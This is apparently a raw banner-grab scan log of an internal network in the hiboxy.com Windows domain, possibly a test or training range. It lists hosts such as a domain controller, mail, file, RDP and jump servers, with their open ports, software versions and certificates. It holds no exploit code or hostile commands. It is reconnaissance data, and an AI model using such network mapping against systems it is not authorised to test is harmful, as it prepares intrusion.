Host: 10.130.10.21 ()	Port: 445	Service: smb	Banner: SMBv2  guid=cfc369a7-11b2-4620-b7df-bd723e148173 time=2024-09-24 04:19:44  boottime=1601-01-01 00:00:00  domain=HIBOXY version=10.0.20348 ntlm-ver=15 domain=HIBOXY name=JUMP01 domain-dns=hiboxy.com name-dns=jump01.hiboxy.com forest=hiboxy.com
Host: 10.130.10.22 ()	Port: 22	Service: ssh	Banner: SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5\x0d\x0a\x00\x00\x04\x5c\x07\x14(\x82\x18\xf5\xbc\xe4\x9am\xea\xe2s\x00;\xa9\x03 \x00\x00\x011sntrup761x25519-sha512@openssh.com,curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,ext-info-s,kex-strict-s-v00@openssh.com\x00\x00\x009rsa-sha2-512,rsa-sha2-256,ecdsa-sha2-nistp256,ssh-ed25519\x00\x00\x00lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com\x00\x00\x00lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com\x00\x00\x00\xd5umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1\x00\x00\x00\xd5umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1\x00\x00\x00\x15none,zlib@openssh.com\x00\x00\x00\x15none,zlib@openssh.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04D\x0a\x1f\x00\x00\x01\x97\x00\x00\x00\x07ssh-rsa\x00\x00\x00\x03\x01\x00\x01\x00\x00\x01\x81\x00\xbbQ\xd7\xfc\xc4\x07\x87\x90\xc2f\x84\xc9/C\x1af\xa0\x91\xd9\x89\x7f\xae\x9cS\xab\xc0\xack\xf0\xca\x83[h;\xe4\x00\xf7w\x85\x9b\xe5\x82\x9a\xfc\xee\xd3\x04\x80a\xd2vh\x93\xed\xec\xfd\x96j+\x11Y\x08\xcd\xd6\xfe0K\xb4\x17\x95\xf1N(\xc1\xd8D\xf9s\xe8;|\xaf\xddl`G\xc7fun\x9c\xbc\xad\x8b\xbdT\xf4\x99\x00\x89\xec`\x1b\x88Q\xfa,E\xa5d\x0c\x83\xb0I\x0d\xaab\xc1\xef\xa1$M\x93\x12;\x13\x8a\xc1\xbf\x1c\xbf\xad\x9f\xf2\xeb2\xf4!\x03mN\xe0\xc72v\xae#\x03\xdc\x05\xb4T\x06\x85\xa1\x0e\xba\xc0\xdb\x86\xf4L\x9f\xe5\xc4\x0c\x80\xd8\x83\xdb\xfe\xf5\xde\x92^\xb5\x0f\x26\xd6\x26*0\x88\x8bf\x0b\x86\x1f\x829\xcf]\xd9\x8b\xc9\x97\xc9T*\x91\xe2\xdb\x19\x16\x06 \xbdW\xc4\xef\xcf1\xd4V\xc4F\x1e\xee\x80\xe49\xee%\xb1\x86\xe4\xa4(\xae\xf7\x03(\xa0\x87g\xe8\xfb2\xf9\xa8\x91\x89bN\xba\xadV#\xd9\x99\x97\xb49)\x8b4\xe6\x84\xde\xba\xa3S\xbbe\xf4\x8c\x1a\x9d\x91\xaa$\x9a\x18\x89\xb7Srn\xf7\xaf\xf2m\x1a\x7f\xf0\xf7\xddE\x99\xc9g$\xc1\xecC\xe8\xab\x95\xa9\x16\xd8\x06B\xf4\x8b\xe5@u\xa3@\xeb\xb7\xe7\x8a\xa6\x86\xe15\x1cO\xae\x97\xd5\xcc|\xd2\x92!!\xed;\xaa#d\xae\x12\x8au\x7f\xe8\x05M9\xacKc\xc3h\xee\x3cZ\xe3i\x1a~NQ0\xbed\xbc\x11\xd3\x04~9\xc3T$M\xb6d\xe2)\x8a\xc7\x8d\x11\x15\xc0\xfdtB\x05\x00\x00\x01\x01\x00\xf4\xf6$\x81i\xe7b.\x0eG\xf7\xd1@U2K\xf1o\xee\xf3D\x8a\xa8d\xe5\x8c\xe2\x0fV*n\xf1y\xba\xfc\xd1\x16/\xfc\xe1\xfe[TD\xc9r\x27$\x86\xfe@\x86\x11n\x82\xe6\xeeh\xf0\x80\xa8\xb2\xaa\x9b)\xe0N\x8d\xf4\xe6\xf0q\xbf\xfc\x8a\x0c\x0b\xd1\xd4RJ\x0a\xbeYB^\xb6\x0d\xc4x\xaf\x84\x9b\xf7\xb8\x03\xc9\x17\x82\x8a\x14\xd9\x04A\xb6{1\x82\xf4\xfch\xfa\x13\xef\xcf\x85Y\x3e\x1a\xd2\x9a:\xaaF\xa7\xcb\xfaB\xfc\x18%\x05O\xf1\xd2PL\xd2s\xd3/\x0e\xa4\xffy\xb9\xb1\xeb\x82\x1c\x86\xa2\xe2\x90\xa3\xcaWG?\x0a\x9b\x11\x81\xd4\x09\x90\x0f\xfbF\x89\x18\xb2\x0d\x8e^8PF\xae\x27\xbb\x9a\xc0\x97k^\xa2\x94\x82\x16\xc4f\x9f$\xb3\x1d\xc2\xa9\x1c\x9f-\xe4\xc9*\x1c\x0eD\x91\xc2A\x99q4\xb0z\x93\xffV0\xbc\x7f\xcc\x03RN\xb4f\xf8\xebCn`\xd2g\x96G\x01\xcf\x12aLfO\xa9W\xa0\xdc\xca\xd8\x0d\x22X\x87\x90\xe3\x9c\x00\x00\x01\x94\x00\x00\x00\x0crsa-sha2-512\x00\x00\x01\x80Q7\xda\x08\x82R\xa9\x08\xf2\xf2L\xc9,\x8c\xf2\xe27bCA\xb8:%\xd4\x8c\xbd\x00*\x0aP\xcb\xc1i\xa27E\xdf\xce\xfd~K\xcb\xd9\xf7\x804I\x0e`\xe1\xb0\x8d\xb4\xc7a\xa0\x01\xab\x11;\xda\xd8\xb0\xddHi\x9a\xad\x1a\x0anZ\xf7\xfa\xcf\xb6\xa9\xcc7\xbb\xa2\x81\x26/-\x9b(\x1a_\xbaCd\x17\xb0*`\xee\xae\x05t@S\x12xi;\x984_\xb38\xb7\x09\xaeX\xb8 \x13m\x00\xd9(\x82\x82\xcf,\xe9g\x98\x89(\x88\xb8\xd1\xd2/\x1b\x89\x8a\xae\x1f\x93\xcf~\x1b.\xc5\xa0\x0a\x15\xd4g\xe5\x95\x170\x1e\x95\xf3\xa8\xc8\x92\xa4\x13\xdfO\x13?uQ\xe4\x17\x0b\xf1\xc1\x13\xe4A\xb0\xbc\xfbL[e\x12\x840\xd2\x85\xd6MU\x11\x07\xe5\x81\xa3~\xa9\xae\x1e%\xf7\xc0HS\xc9\x3c\x96\xba\x83\x86\x22S\x19\x16cOtA\xc5\xe7\x9b\x02\xf2\xb0$p\x17\xf5\xf4?\x19f\x1a\xfb\xfe4L$\xb3Yg1\xa9h\xc5\xa4\xa0Vr\x99a$\x17Ef`\x88\xf1\xa1h\xa4\x17\xb7\xb5\xd3\xf7.\xc5 \x09G\xc0\xbf\xa1yC\x1f\x10Jr\xa1@X\x1a*\x8e\xaf\x03\xe1I\xc5\xe8\xb6\xdf\x08:\x09o\xc87%\xf6\xa9\xbd%\xf3\x18\xff\x81\xf5@vj}G\x012\x90\x13T\xf0\x8d\xa7z\xd6Os\xf6MHwh\x04\x10\x8b@\x08\xb2\xc4\xbb\xeb\xb0\x8f\xa6\xcf\xdc\xc9\xb32%n\x9a\xc8;8R\x02\xe5\xdcr\xd2\xe5\xc5\xd5\x88Y\xfd!{\xe8\xd5\x996\x0e!\x81\xbe\xdd5\xbby\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x0a\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x17(\xfb\x90\x8e\xf0\xee\xba\xa9Q\xce\xc5fH)k\xfc\x86\xa7D8\xb1K\xca\x82\xa4\x82h\x93\x0bJ\x1a\x0b\xf0*\xdd\xfdu\x90\x87\xa0\xe7\xc6;\xa7\xd2{\x01A\xc4\xe48\xb5\x1eN\xb2\xa4j\xc7\x01@X4\xe6\x82\xe7\x9d\x27\xd1\xdc\x84i\x05\x9e\x8e\x3c\xb9q\x86hQ\xdbQ\xda\xe8\xe5o\x89r.\xec\xa7\xc2K\xb6|\xf4\x22\xcd\xaa\x9a\xee\x14Zm\x3c\xdf\x88\xef\xf3A\xa9\x07\x01\x11\x0d\x15\x19\x14_\xc6\x13\xc07\xd5\x8ctbwUp\xd4\xa9Bx\xb7\x9d|\x1eb\xbd\xff\xa4\xd2A\x17\xcc\xe8\xb0\x8b\xf7\xc3F\xf6}\xafX\x99!\x08R\xcbw\xe8\xf4\xc3\x80\xb1\xee\x83\xfbs\x11\x92\xd2\xb1[\x1a\x7fh\xbawN\x9a\x1d\xdb\x1f\x0b\xdc\x96\xee\xba\x02\xbah\xcf\xe3\x97\xb3\xee\xf7\xd8\x01\xd9\x99\xa5\x13\xd9\xa3+\xab|\x13k8V
Host: 10.130.10.23 ()	Port: 3389	Service: rdp	Banner:  NLA-supported
Host: 10.130.10.23 ()	Port: 445	Service: smb	Banner: SMBv2  guid=0c859c71-e294-4cfc-a904-1b080f085032 time=2024-09-24 04:20:53  boottime=1601-01-01 00:00:00  domain=HIBOXY version=10.0.20348 ntlm-ver=15 domain=HIBOXY name=RDP01 domain-dns=hiboxy.com name-dns=rdp01.hiboxy.com forest=hiboxy.com
Host: 10.130.10.25 ()	Port: 139	Service: smb	Banner: ERROR(Called name not present)
Host: 10.130.10.25 ()	Port: 2525	Service: ftp	Banner: 220 mail01.hiboxy.com Microsoft ESMTP MAIL Service ready at Tue, 24 Sep 2024 04:24:37 +0000\x0a503 5.5.2 Send hello first
Host: 10.130.10.25 ()	Port: 25	Service: smtp	Banner: 220 mail01.hiboxy.com Microsoft ESMTP MAIL Service ready at Tue, 24 Sep 2024 04:21:14 +0000\x0a250-mail01.hiboxy.com Hello [10.254.252.3]\x0a250-SIZE 37748736\x0a250-PIPELINING\x0a250-DSN\x0a250-ENHANCEDSTATUSCODES\x0a250-STARTTLS\x0a250-X-ANONYMOUSTLS\x0a250-AUTH NTLM\x0a250-X-EXPS GSSAPI NTLM\x0a250-8BITMIME\x0a250-BINARYMIME\x0a250-CHUNKING\x0a250-SMTPUTF8\x0a250 XRDST\x0a220 2.0.0 SMTP server ready
Host: 10.130.10.25 ()	Port: 25	Service: ssl	Banner: TLS/1.2 cipher:0xc030, mail01, mail01, mail01.hiboxy.com
Host: 10.130.10.25 ()	Port: 25	Service: X509	Banner: MIIDBzCCAe+gAwIBAgIQODDHsNbjBZNBr4Q8jkb1izANBgkqhkiG9w0BAQUFADARMQ8wDQYDVQQDEwZtYWlsMDEwHhcNMjQwOTExMjM1NTUyWhcNMjkwOTExMjM1NTUyWjARMQ8wDQYDVQQDEwZtYWlsMDEwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDF/T7gFVULRoivsyQQQjJIdbLydrPKEKdlaoA8akwan4LDX8hT+OoISu19i0/Khdn8Xy6DUZSY3dGeMZPBO149CNeyiSXQVOr38BDPBL2mxJhdBjf3BKFe2H0CspBdo7vCDkLnVoKCYahUdpgkO5kL8m51g7nTH5L117L48nX2NJg7W5kTcFp6fBfCdAKBZk79f+8udN4gKCVJf+YcUIeyKpezziGdbQXowAGI5KhXM21iwbKMrDVW/Bw8cQlgNgtq7/gBG4xVQmIc57msgbMozZiIEUmNjbEzLmOlEz1La/AUWb4QeBVW3m/Py4UPgJ3OuRFyC6nwKEKNxb4cjqARAgMBAAGjWzBZMA4GA1UdDwEB/wQEAwIFoDAkBgNVHREEHTAbggZtYWlsMDGCEW1haWwwMS5oaWJveHkuY29tMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQEFBQADggEBAAY9K0ea6ExbNZdkc6VavH0U1VnudcdGpTSc6v+K+rWiUC3W/yE96/zWMbPoBoZcdFUA269H9DZK4z0yTQL9queIY7I2XuldS3vPRuiTLlo5V93wM5YgWWmfmpFdX4gcbqi9catyzmuMIGJIYjguPUfSSmBeRU/7hb9J5bplJ3eoKYc+4msRrh6gvQNYvm0CdaQ9wnpHRbYRKc5KsLjYGJgaMf700lqOyRjMLARw1m8pJnK/z42h2zjLue2Sn1KCFNscl8m0NTu7BUfwYWInZuE6bZxlKubSNCKNk7fXjhUkXdOHH7/TIycg02bWKXGK53froqvkJiWOPULI6h1ur0g=
Host: 10.130.10.25 ()	Port: 3389	Service: rdp	Banner:  NLA-supported
Host: 10.130.10.25 ()	Port: 443	Service: ssl	Banner: TLS/1.2 cipher:0xc030, mail01, mail01, mail01.hiboxy.com
Host: 10.130.10.25 ()	Port: 443	Service: ssl	Banner: TLS/1.2 cipher:0xc030, mail01, mail01, mail01.hiboxy.com
Host: 10.130.10.25 ()	Port: 443	Service: X509	Banner: MIIDBzCCAe+gAwIBAgIQODDHsNbjBZNBr4Q8jkb1izANBgkqhkiG9w0BAQUFADARMQ8wDQYDVQQDEwZtYWlsMDEwHhcNMjQwOTExMjM1NTUyWhcNMjkwOTExMjM1NTUyWjARMQ8wDQYDVQQDEwZtYWlsMDEwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDF/T7gFVULRoivsyQQQjJIdbLydrPKEKdlaoA8akwan4LDX8hT+OoISu19i0/Khdn8Xy6DUZSY3dGeMZPBO149CNeyiSXQVOr38BDPBL2mxJhdBjf3BKFe2H0CspBdo7vCDkLnVoKCYahUdpgkO5kL8m51g7nTH5L117L48nX2NJg7W5kTcFp6fBfCdAKBZk79f+8udN4gKCVJf+YcUIeyKpezziGdbQXowAGI5KhXM21iwbKMrDVW/Bw8cQlgNgtq7/gBG4xVQmIc57msgbMozZiIEUmNjbEzLmOlEz1La/AUWb4QeBVW3m/Py4UPgJ3OuRFyC6nwKEKNxb4cjqARAgMBAAGjWzBZMA4GA1UdDwEB/wQEAwIFoDAkBgNVHREEHTAbggZtYWlsMDGCEW1haWwwMS5oaWJveHkuY29tMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQEFBQADggEBAAY9K0ea6ExbNZdkc6VavH0U1VnudcdGpTSc6v+K+rWiUC3W/yE96/zWMbPoBoZcdFUA269H9DZK4z0yTQL9queIY7I2XuldS3vPRuiTLlo5V93wM5YgWWmfmpFdX4gcbqi9catyzmuMIGJIYjguPUfSSmBeRU/7hb9J5bplJ3eoKYc+4msRrh6gvQNYvm0CdaQ9wnpHRbYRKc5KsLjYGJgaMf700lqOyRjMLARw1m8pJnK/z42h2zjLue2Sn1KCFNscl8m0NTu7BUfwYWInZuE6bZxlKubSNCKNk7fXjhUkXdOHH7/TIycg02bWKXGK53froqvkJiWOPULI6h1ur0g=
Host: 10.130.10.25 ()	Port: 443	Service: X509	Banner: MIIDBzCCAe+gAwIBAgIQODDHsNbjBZNBr4Q8jkb1izANBgkqhkiG9w0BAQUFADARMQ8wDQYDVQQDEwZtYWlsMDEwHhcNMjQwOTExMjM1NTUyWhcNMjkwOTExMjM1NTUyWjARMQ8wDQYDVQQDEwZtYWlsMDEwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDF/T7gFVULRoivsyQQQjJIdbLydrPKEKdlaoA8akwan4LDX8hT+OoISu19i0/Khdn8Xy6DUZSY3dGeMZPBO149CNeyiSXQVOr38BDPBL2mxJhdBjf3BKFe2H0CspBdo7vCDkLnVoKCYahUdpgkO5kL8m51g7nTH5L117L48nX2NJg7W5kTcFp6fBfCdAKBZk79f+8udN4gKCVJf+YcUIeyKpezziGdbQXowAGI5KhXM21iwbKMrDVW/Bw8cQlgNgtq7/gBG4xVQmIc57msgbMozZiIEUmNjbEzLmOlEz1La/AUWb4QeBVW3m/Py4UPgJ3OuRFyC6nwKEKNxb4cjqARAgMBAAGjWzBZMA4GA1UdDwEB/wQEAwIFoDAkBgNVHREEHTAbggZtYWlsMDGCEW1haWwwMS5oaWJveHkuY29tMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQEFBQADggEBAAY9K0ea6ExbNZdkc6VavH0U1VnudcdGpTSc6v+K+rWiUC3W/yE96/zWMbPoBoZcdFUA269H9DZK4z0yTQL9queIY7I2XuldS3vPRuiTLlo5V93wM5YgWWmfmpFdX4gcbqi9catyzmuMIGJIYjguPUfSSmBeRU/7hb9J5bplJ3eoKYc+4msRrh6gvQNYvm0CdaQ9wnpHRbYRKc5KsLjYGJgaMf700lqOyRjMLARw1m8pJnK/z42h2zjLue2Sn1KCFNscl8m0NTu7BUfwYWInZuE6bZxlKubSNCKNk7fXjhUkXdOHH7/TIycg02bWKXGK53froqvkJiWOPULI6h1ur0g=
Host: 10.130.10.25 ()	Port: 445	Service: smb	Banner: SMBv2  guid=50edb45e-9b83-4616-9aa8-2882f1c31935 time=2024-09-24 04:20:47  boottime=1601-01-01 00:00:00  domain=HIBOXY version=10.0.20348 ntlm-ver=15 domain=HIBOXY name=MAIL01 domain-dns=hiboxy.com name-dns=mail01.hiboxy.com forest=hiboxy.com
Host: 10.130.10.25 ()	Port: 465	Service: ftp	Banner: 220 mail01.hiboxy.com Microsoft ESMTP MAIL Service ready at Tue, 24 Sep 2024 04:20:07 +0000\x0a503 5.5.2 Send hello first
Host: 10.130.10.25 ()	Port: 465	Service: ftp	Banner: 220 mail01.hiboxy.com Microsoft ESMTP MAIL Service ready at Tue, 24 Sep 2024 04:20:09 +0000\x0a500 5.3.3 Unrecognized command \x27\x3credacted\x3e\x27
Host: 10.130.10.25 ()	Port: 475	Service: ftp	Banner: 220 mail01.hiboxy.com MICROSOFT ESMTP MAIL SERVICE READY AT Tue, 24 Sep 2024 04:21:57 +0000\x0a503 5.5.1 Bad sequence of commands
Host: 10.130.10.25 ()	Port: 476	Service: ftp	Banner: 220 mail01.hiboxy.com MICROSOFT ESMTP MAIL SERVICE READY AT Tue, 24 Sep 2024 04:22:03 +0000\x0a503 5.5.1 Bad sequence of commands
Host: 10.130.10.25 ()	Port: 477	Service: ftp	Banner: 220 mail01.hiboxy.com MICROSOFT ESMTP MAIL SERVICE READY AT Tue, 24 Sep 2024 04:19:11 +0000\x0a503 5.5.1 Bad sequence of commands
Host: 10.130.10.25 ()	Port: 587	Service: smtp	Banner: 220 mail01.hiboxy.com Microsoft ESMTP MAIL Service ready at Tue, 24 Sep 2024 04:22:53 +0000\x0a250-mail01.hiboxy.com Hello [10.254.252.3]\x0a250-SIZE 37748736\x0a250-PIPELINING\x0a250-DSN\x0a250-ENHANCEDSTATUSCODES\x0a250-STARTTLS\x0a250-AUTH GSSAPI NTLM\x0a250-8BITMIME\x0a250-BINARYMIME\x0a250-CHUNKING\x0a250 SMTPUTF8\x0a220 2.0.0 SMTP server ready
Host: 10.130.10.25 ()	Port: 587	Service: ssl	Banner: TLS/1.2 cipher:0xc030, mail01, mail01, mail01.hiboxy.com
Host: 10.130.10.25 ()	Port: 587	Service: X509	Banner: MIIDBzCCAe+gAwIBAgIQODDHsNbjBZNBr4Q8jkb1izANBgkqhkiG9w0BAQUFADARMQ8wDQYDVQQDEwZtYWlsMDEwHhcNMjQwOTExMjM1NTUyWhcNMjkwOTExMjM1NTUyWjARMQ8wDQYDVQQDEwZtYWlsMDEwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDF/T7gFVULRoivsyQQQjJIdbLydrPKEKdlaoA8akwan4LDX8hT+OoISu19i0/Khdn8Xy6DUZSY3dGeMZPBO149CNeyiSXQVOr38BDPBL2mxJhdBjf3BKFe2H0CspBdo7vCDkLnVoKCYahUdpgkO5kL8m51g7nTH5L117L48nX2NJg7W5kTcFp6fBfCdAKBZk79f+8udN4gKCVJf+YcUIeyKpezziGdbQXowAGI5KhXM21iwbKMrDVW/Bw8cQlgNgtq7/gBG4xVQmIc57msgbMozZiIEUmNjbEzLmOlEz1La/AUWb4QeBVW3m/Py4UPgJ3OuRFyC6nwKEKNxb4cjqARAgMBAAGjWzBZMA4GA1UdDwEB/wQEAwIFoDAkBgNVHREEHTAbggZtYWlsMDGCEW1haWwwMS5oaWJveHkuY29tMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQEFBQADggEBAAY9K0ea6ExbNZdkc6VavH0U1VnudcdGpTSc6v+K+rWiUC3W/yE96/zWMbPoBoZcdFUA269H9DZK4z0yTQL9queIY7I2XuldS3vPRuiTLlo5V93wM5YgWWmfmpFdX4gcbqi9catyzmuMIGJIYjguPUfSSmBeRU/7hb9J5bplJ3eoKYc+4msRrh6gvQNYvm0CdaQ9wnpHRbYRKc5KsLjYGJgaMf700lqOyRjMLARw1m8pJnK/z42h2zjLue2Sn1KCFNscl8m0NTu7BUfwYWInZuE6bZxlKubSNCKNk7fXjhUkXdOHH7/TIycg02bWKXGK53froqvkJiWOPULI6h1ur0g=
Host: 10.130.10.25 ()	Port: 717	Service: ftp	Banner: 220 mail01.hiboxy.com Microsoft ESMTP MAIL Service ready at Tue, 24 Sep 2024 04:21:42 +0000\x0a503 5.5.2 Send hello first
Host: 10.130.10.25 ()	Port: 80	Service: http	Banner: HTTP/1.1 403 Forbidden\x0d\x0aServer: Microsoft-IIS/10.0\x0d\x0aDate: Tue, 24 Sep 2024 04:24:01 GMT\x0d\x0aConnection: close\x0d\x0aContent-Length: 0\x0d\x0a\x0d
Host: 10.130.10.25 ()	Port: 80	Service: http.server	Banner: Microsoft-IIS/10.0
Host: 10.130.10.33 ()	Port: 1433	Service: unknown	Banner: \x04\x01\x00%\x00\x00\x01\x00\x00\x00\x15\x00\x06\x01\x00\x1b\x00\x01\x02\x00\x1c\x00\x01\x03\x00\x1d\x00\x00\xff\x10\x00\x10\x27\x00\x00\x00\x00
Host: 10.130.10.33 ()	Port: 3389	Service: rdp	Banner:  NLA-supported
Host: 10.130.10.44 ()	Port: 139	Service: smb	Banner: ERROR(Called name not present)
Host: 10.130.10.44 ()	Port: 3389	Service: rdp	Banner:  NLA-supported
Host: 10.130.10.44 ()	Port: 445	Service: smb	Banner: SMBv2  guid=d58ae2b5-d57e-4fa3-8397-9be854b5f0f4 time=2024-09-24 04:23:00  boottime=1601-01-01 00:00:00  domain=HIBOXY version=10.0.20348 ntlm-ver=15 domain=HIBOXY name=FILE01 domain-dns=hiboxy.com name-dns=file01.hiboxy.com forest=hiboxy.com
Host: 10.130.10.4 ()	Port: 139	Service: smb	Banner: ERROR(Called name not present)
Host: 10.130.10.4 ()	Port: 3268	Service: unknown	Banner: 0\x84\x00\x00\x0bn\x02\x01\x07d\x84\x00\x00\x0be\x04\x000\x84\x00\x00\x0b]0\x84\x00\x00\x00\x1e\x04\x13domainFunctionality1\x84\x00\x00\x00\x03\x04\x0170\x84\x00\x00\x00\x1e\x04\x13forestFunctionality1\x84\x00\x00\x00\x03\x04\x0170\x84\x00\x00\x00(\x04\x1ddomainControllerFunctionality1\x84\x00\x00\x00\x03\x04\x0170\x84\x00\x00\x001\x04\x17rootDomainNamingContext1\x84\x00\x00\x00\x12\x04\x10DC=hiboxy,DC=com0\x84\x00\x00\x004\x04\x0fldapServiceName1\x84\x00\x00\x00\x1d\x04\x1bhiboxy.com:dc01$@HIBOXY.COM0\x84\x00\x00\x00\x22\x04\x14isGlobalCatalogReady1\x84\x00\x00\x00\x06\x04\x04TRUE0\x84\x00\x00\x00I\x04\x17supportedSASLMechanisms1\x84\x00\x00\x00*\x04\x06GSSAPI\x04\x0aGSS-SPNEGO\x04\x08EXTERNAL\x04\x0aDIGEST-MD50\x84\x00\x00\x00\x22\x04\x14supportedLDAPVersion1\x84\x00\x00\x00\x06\x04\x013\x04\x0120\x84\x00\x00\x01\x9a\x04\x15supportedLDAPPolicies1\x84\x00\x00\x01}\x04\x0eMaxPoolThreads\x04\x19MaxPercentDirSyncRequests\x04\x0fMaxDatagramRecv\x04\x10MaxReceiveBuffer\x04\x0fInitRecvTimeout\x04\x0eMaxConnections\x04\x0fMaxConnIdleTime\x04\x0bMaxPageSize\x04\x16MaxBatchReturnMessages\x04\x10MaxQueryDuration\x04\x12MaxDirSyncDuration\x04\x10MaxTempTableSize\x04\x10MaxResultSetSize\x04\x0dMinResultSets\x04\x14MaxResultSetsPerConn\x04\x16MaxNotificationPerConn\x04\x0bMaxValRange\x04\x15MaxValRangeTransitive\x04\x11ThreadMemoryLimit\x04\x18SystemMemoryLimitPercent0\x84\x00\x00\x03\xf4\x04\x10supportedControl1\x84\x00\x00\x03\xdc\x04\x161.2.840.113556.1.4.319\x04\x161.2.840.113556.1.4.801\x04\x161.2.840.113556.1.4.473\x04\x161.2.840.113556.1.4.528\x04\x161.2.840.113556.1.4.417\x04\x161.2.840.113556.1.4.619\x04\x161.2.840.113556.1.4.841\x04\x161.2.840.113556.1.4.529\x04\x161.2.840.113556.1.4.805\x04\x161.2.840.113556.1.4.521\x04\x161.2.840.113556.1.4.970\x04\x171.2.840.113556.1.4.1338\x04\x161.2.840.113556.1.4.474\x04\x171.2.840.113556.1.4.1339\x04\x171.2.840.113556.1.4.1340\x04\x171.2.840.113556.1.4.1413\x04\x172.16.840.1.113730.3.4.9\x04\x182.16.840.1.113730.3.4.10\x04\x171.2.840.113556.1.4.1504\x04\x171.2.840.113556.1.4.1852\x04\x161.2.840.113556.1.4.802\x04\x171.2.840.113556.1.4.1907\x04\x171.2.840.113556.1.4.1948\x04\x171.2.840.113556.1.4.1974\x04\x171.2.840.113556.1.4.1341\x04\x171.2.840.113556.1.4.2026\x04\x171.2.840.113556.1.4.2064\x04\x171.2.840.113556.1.4.2065\x04\x171.2.840.113556.1.4.2066\x04\x171.2.840.113556.1.4.2090\x04\x171.2.840.113556.1.4.2205\x04\x171.2.840.113556.1.4.2204\x04\x171.2.840.113556.1.4.2206\x04\x171.2.840.113556.1.4.2211\x04\x171.2.840.113556.1.4.2239\x04\x171.2.840.113556.1.4.2255\x04\x171.2.840.113556.1.4.2256\x04\x171.2.840.113556.1.4.2309\x04\x171.2.840.113556.1.4.2330\x04\x171.2.840.113556.1.4.23540\x84\x00\x00\x00\xb2\x04\x15supportedCapabilities1\x84\x00\x00\x00\x95\x04\x161.2.840.113556.1.4.800\x04\x171.2.840.113556.1.4.1670\x04\x171.2.840.113556.1.4.1791\x04\x171.2.840.113556.1.4.1935\x04\x171.2.840.113556.1.4.2080\x04\x171.2.840.113556.1.4.22370\x84\x00\x00\x00S\x04\x11subschemaSubentry1\x84\x00\x00\x00:\x048CN=Aggregate,CN=Schema,CN=Configuration,DC=hiboxy,DC=com0\x84\x00\x00\x00l\x04\x0aserverName1\x84\x00\x00\x00Z\x04XCN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=hiboxy,DC=com0\x84\x00\x00\x00H\x04\x13schemaNamingContext1\x84\x00\x00\x00-\x04+CN=Schema,CN=Configuration,DC=hiboxy,DC=com0\x84\x00\x00\x00\xc0\x04\x0enamingContexts1\x84\x00\x00\x00\xaa\x04\x10DC=hiboxy,DC=com\x04!CN=Configuration,DC=hiboxy,DC=com\x04+CN=Schema,CN=Configuration,DC=hiboxy,DC=com\x04\x22DC=DomainDnsZones,DC=hiboxy,DC=com\x04\x22DC=ForestDnsZones,DC=hiboxy,DC=com0\x84\x00\x00\x00\x1c\x04\x0eisSynchronized1\x84\x00\x00\x00\x06\x04\x04TRUE0\x84\x00\x00\x00#\x04\x13highestCommittedUSN1\x84\x00\x00\x00\x08\x04\x061584030\x84\x00\x00\x00\x80\x04\x0ddsServiceName1\x84\x00\x00\x00k\x04iCN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=hiboxy,DC=com0\x84\x00\x00\x00$\x04\x0bdnsHostName1\x84\x00\x00\x00\x11\x04\x0fdc01.hiboxy.com0\x84\x00\x00\x00.\x04\x14defaultNamingContext1\x84\x00\x00\x00\x12\x04\x10DC=hiboxy,DC=com0\x84\x00\x00\x00\x26\x04\x0bcurrentTime1\x84\x00\x00\x00\x13\x04\x1120240924042121.0Z0\x84\x00\x00\x00E\x04\x1aconfigurationNamingContext1\x84\x00\x00\x00#\x04!CN=Configuration,DC=hiboxy,DC=com0\x84\x00\x00\x00\x10\x02\x01\x07e\x84\x00\x00\x00\x07\x0a\x01\x00\x04\x00\x04\x00
Host: 10.130.10.4 ()	Port: 3269	Service: ssl	Banner: TLS/1.2 cipher:0x1302
Host: 10.130.10.4 ()	Port: 3269	Service: ssl	Banner: TLS/1.2 cipher:0xc030, dc01.hiboxy.com
